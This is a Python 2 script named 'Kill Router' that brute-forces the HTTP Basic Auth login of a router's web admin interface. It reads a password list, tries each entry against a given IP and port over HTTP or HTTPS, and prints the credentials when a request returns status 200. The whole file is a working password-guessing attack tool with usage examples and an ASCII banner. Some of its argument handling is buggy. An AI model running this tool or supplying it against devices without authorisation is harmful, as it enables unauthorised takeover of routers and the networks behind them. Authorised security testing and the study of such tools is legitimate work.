#!/usr/bin/python
# -*- coding: utf-8 -*-


import requests
import sys
import argparse
import Queue
from termcolor import colored

__AUTOR__   =   'Matheus Fidelis'
__GITHUB__  =   'https://github.com/msfidelis'
__BLOG__    =   'http://nanoshots.com.br'


def usage():
    print colored("""

    ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
    ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
   ▓███▄░ ▒██▒▒██░    ▒██░       ▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
   ▓██ █▄ ░██░▒██░    ▒██░       ▒██▀▀█▄  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
   ▒██▒ █▄░██░░██████▒░██████▒   ░██▓ ▒██▒░ ████▓▒░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
   ░ ░░ ░  ▒ ░  ░ ░     ░ ░        ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░   ░         ░     ░░   ░
   ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░

								v0.1
    """, 'red', attrs=['bold'])
    print colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -p [TARGET PORT] -u [USER TO TEST] -l [PATH TO PASSLIST]", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt", 'red', attrs=['bold'])
    print colored("[!] Use -m to change request HTTP to HTTPS", 'red', attrs=['bold'])
    print colored("[!] ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt -m https", 'red', attrs=['bold'])


#FUNÇÃO RESPONSÁVEL PELO BRUTEFORCE
def bruteforce(target,port,ssl, passlist,username):
    #Abre a passlist
    url = '%s:%s' % (target, port)
    fd = open(passlist, 'rw')
    passwords = fd.readlines()
    passes = Queue.Queue()

    for password in passwords:
        password = password.rstrip()
        passes.put(password)

    i = 0
    print ""
    print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
    print colored("STARTING TEST ON HOST: %s",'blue', attrs=['bold']) % (url)
    print ""

    while not passes.empty():
        password = passes.get()

        i = i + 1

        #AQUI IREMOS AVALIAR O PROTOCOLO, CASO ELE FOR TRUE, IRÁ REALIZAR REQUESTS COM O SSL
        if ssl is True:
            test = requests.get('https://'+url, auth=(username, password))
        else:
            test = requests.get('http://'+url, auth=(username, password))

        code = test.status_code
        print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
        if code == 200:
            print ""
            print colored("==========================[LOGIN FOUND]==========================", 'yellow', attrs=['bold'])
            print ""
            print colored("===================================================================", 'yellow', attrs=['bold'])
            print colored("               [  :: USER[%s] AND PASS[%s]  ]                      ", 'green', attrs=['bold']) % (username, password)
            print colored("===================================================================", 'yellow', attrs=['bold'])

            sys.exit()
        else:
            pass


def main():

    target = ''
    passlist = ''
    username = ''

    #Faz o parsing dos argumentos
    parser = argparse.ArgumentParser(description = "Kill Router", add_help = False)
    parser.add_argument('-h', '--help', action=usage(), help='usage')
    parser.add_argument('-t', '--target',help='Informe o roteador alvo')
    parser.add_argument('-m', '--method',help='Informa o Método HTTP ou HTTPS')
    parser.add_argument('-p', '--port',help='Informa a porta')
    parser.add_argument('-l', '--passlist',help='Informa a passlist')
    parser.add_argument('-u','--username',help='Informa o usuário a ser testado')
    args = parser.parse_args()

    target = args.target
    port = args.port
    ssl = args.method
    passlist = args.passlist
    username = args.username

    #Força o valor padrão para 80 caso a porta não seja especificada.
    if port is None:
        port = 80

    #Seta o valor default do method http ou https
    if ssl is None:
        ssl = False
    else:
        ssl = True


    bruteforce(target,port,ssl, passlist,username)


main()
